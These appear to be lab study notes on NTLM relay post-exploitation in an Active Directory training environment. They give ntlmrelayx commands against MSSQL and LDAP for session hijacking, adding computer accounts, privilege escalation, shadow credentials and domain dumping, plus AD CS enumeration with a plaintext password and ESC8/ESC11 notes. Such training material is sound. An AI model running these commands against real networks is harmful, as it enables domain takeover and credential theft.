This phase contain:
- Getting the Authentication session from the server, takes advantage of the authenticated session we obtained through relaying a victim's `NTLM` authentication. We can conduct specific post-relay attacks depending on the authenticated session's protocol.
- After waiting for a while and getting the wanted service, you can stop relaying service using `stopservers` then you can interact with the established session from `-sock`.

### mssql
```sh
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -i
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks --no-da --no-acl --lootdir ldap_dump
proxychains -q mssqlclient.py INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass
```

### ldap
```sh
# Sometimes socks doesn't work with ldap, so use -i as interactive session.
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support -i
# `--no-da` disables adding a domain admin while `--no-acl` prevents abusing misconfigured `ACLs`. The `--lootdir`/`-l` option allows specifying a directory where `ntlmrelayx` will dump the LDAP domain information.
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
sudo ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl --no-smb-server
```

---

### ADCS
- We can enrolle to a certificate using http in specific endpoints like `http://<servername>/certsrv/certfnsh.asp`
- using certipy, it flags for `ESC8` and `ESC11`. `ESC8`, it is due to the `CA` having `Web Enrollment` set to `Enabled` (and `Request Disposition` set to `Issue`), while for `ESC11`, it is due to the `CA` not enforcing encryption for `ICPR` requests (and that `Request Disposition` is set to `Issue`)
```sh
# Enmerate env for ADCS
crackmapexec ldap 172.16.117.0/24 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs
ADCS                                                Found PKI Enrollment Server: DC01.INLANEFREIGHT.LOCAL
ADCS                                                Found CN: INLANEFREIGHT-DC01-CA

```


> [!Danger] 
> before exploiting `ESC8`,`ESC11`. it is crucial to remember that in our testing-ground environment, `AD CS` should live in different host other than DC we are targeting, if its not, this configuration disallows us from conducting certain attacks, such as relaying a coerced `HTTP` `NTLM` authentication from the DC to a vulnerable web enrollment endpoint requesting the `DomainController` template, due to the `NTLM` `self-relay` attack being patched on almost all systems nowadays. Nevertheless, in real-world engagements, more than one DC will exist; therefore, carrying out `ESC8` or `ESC11` against them might be fruitful.
